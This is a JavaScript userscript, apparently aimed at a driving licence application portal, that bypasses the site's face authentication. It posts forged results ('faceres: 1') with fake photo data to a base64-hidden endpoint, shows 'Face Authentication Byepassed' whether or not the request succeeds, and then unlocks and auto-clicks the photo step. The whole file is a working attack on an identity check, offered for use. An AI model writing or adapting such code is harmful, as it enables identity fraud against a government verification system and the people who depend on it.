(function () {
    'use strict';

    // jQuery Injection (script1.js content - trimmed)
    // Add if needed or load from CDN
    var script = document.createElement("script");
    script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
    script.onload = mainLogic;
    document.head.appendChild(script);

    function mainLogic() {
        // --- script3.js Logic (Face Auth Byepass) ---
        function bypassFaceAuth() {
            if ($('#dobdiv').is(':visible')) {
                const url = atob('c2F2ZUZhY2VBdXRoRGF0YS5kbw=='); // 'saveFaceAuthData.do'
                const capPho = atob('ZGF0YTphcHBsaWNhdGlvbi9wZGY7YmFzZTY0LEpWQkVSaTB4THpjTkNpc2hzOFhYRFFveElER2JjakQ='); // CapPho (fake data)

                $.ajax({
                    type: 'POST',
                    url: url,
                    data: {
                        applno: document.authentication.llappln.value,
                        rtocode: 'JKDC',
                        faceres: 1,
                        CapPho: capPho
                    },
                    dataType: 'json',
                    success: function () {
                        alert('Face Authentication Byepassed');
                        $("#capphto1").removeAttr("disabled");
                    },
                    error: function () {
                        alert('Face Authentication Byepassed');
                        $("#capphto1").removeAttr("disabled");
                    }
                });

                clearInterval(checkInterval);
            }
        }

        const checkInterval = setInterval(bypassFaceAuth, 500);

        // Trigger photo button on 6-digit password
        $('input[name="pwd"]').on("input", function () {
            if ($(this).val().length === 6) {
                $("#capphto1").click();
            }
        });

        // --- Optional: Alert or custom styling from script2.js (SweetAlert2) can be added if needed ---
    }
})();
